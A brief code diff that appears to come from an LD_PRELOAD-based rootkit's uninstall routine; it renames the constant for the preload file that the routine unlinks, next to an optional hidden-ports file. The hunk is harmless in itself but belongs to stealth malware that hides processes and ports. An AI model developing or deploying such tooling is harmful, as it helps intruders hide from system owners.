@@ -55,7 +55,7 @@ void uninstallbdv(void){
 #endif
 
     hook(CUNLINK);
-    if((long)call(CUNLINK, LDSO_PRELOAD) < 0)
+    if((long)call(CUNLINK, PRELOAD_FILE) < 0)
         printf("failed removing preload file\n");
 #ifdef HIDE_PORTS
     if((long)call(CUNLINK, HIDEPORTS) < 0)
